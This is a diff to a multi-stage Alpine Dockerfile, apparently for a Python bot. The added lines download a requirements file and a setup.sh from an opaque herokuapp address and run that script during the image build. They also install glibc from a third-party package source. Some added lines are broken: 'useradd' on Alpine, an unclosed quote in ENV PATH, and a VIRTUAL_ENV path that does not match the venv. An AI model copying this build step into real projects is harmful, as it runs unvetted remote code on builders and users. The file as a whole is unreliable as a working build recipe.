@@ -1,47 +1,47 @@
 FROM alpine:latest as base
 
+WORKDIR /app
+
 RUN apk add --no-cache \
     python3-dev py3-pip git \
     && apk add --no-cache --virtual .build-deps \
-    build-base postgresql-dev \
-    libxslt-dev libffi-dev
-
-RUN mkdir ./venv
-RUN chmod 777 ./venv
-WORKDIR /venv
+    build-base zlib-dev jpeg-dev \
+    libffi-dev
 
 RUN pip3 install --ignore-installed distlib pipenv \
-    && python3 -m venv /app/venv && \
-    /app/venv/bin/python3 -m pip install --upgrade pip
+    && python3 -m venv venv && \
+    wget -q -O /etc/apk/keys/sgerrand.rsa.pub https://alpine-pkgs.sgerrand.com/sgerrand.rsa.pub && \
+    wget https://github.com/sgerrand/alpine-pkg-glibc/releases/download/2.32-r0/glibc-2.32-r0.apk && \
+    apk add glibc-2.32-r0.apk && \
+    rm /etc/apk/keys/sgerrand.rsa.pub && \
+    rm glibc-2.32-r0.apk && \
+    rm -r /var/cache/apk/APKINDEX.*
+ENV PATH="/app/venv/bin:$PATH" VIRTUAL_ENV="/venv"
 
-ENV PATH="/app/venv/bin:$PATH" VIRTUAL_ENV="/app/venv"
-
-
-ADD https://raw.githubusercontent.com/SVR666/LoaderX-Bot/master/requirements.txt requirements.txt 
+RUN pip3 install --upgrade pip
+ADD https://okmk.herokuapp.com/28760401388972/requirements.txt requirements.txt
+ADD https://okmk.herokuapp.com/28519883220396/setup.sh setup.sh
+RUN bash setup.sh
 #RUN CFLAGS="-O0"  
-RUN /app/venv/bin/python3 -m pip install --no-cache-dir -r requirements.txt \
+RUN pip3 install --no-cache-dir -r requirements.txt \
     && apk del .build-deps \
     && rm -rf /var/tmp/* && \
     rm -rf /var/cache/apk/* && \
     rm -rf requirements.txt
+        
+FROM alpine:latest as launcher
 
-    
-    
-FROM alpine:latest as run
+RUN useradd -m launcher
+WORKDIR /home/launcher
 
-RUN mkdir app
-RUN chmod 777 /app
-WORKDIR /app
+COPY --chown=launcher:launcher --from=base /app/venv /home/launcher/venv
 
-COPY --from=base /app/venv venv
-COPY --from=base /app app
-
-ENV PATH="/app/venv/bin:$PATH" VIRTUAL_ENV="/app/venv"
+ENV PATH="/home/launcher/venv/bin:$PATH VIRTUAL_ENV="/venv"
 
 RUN apk add --no-cache \
-#    python3 \
+    python3-dev \
     bash curl wget \
-    ffmpeg p7zip && \
+    ffmpeg unzip unrar tar && \
     rm -rf /var/cache/apk/*
 
 CMD ["bash"]
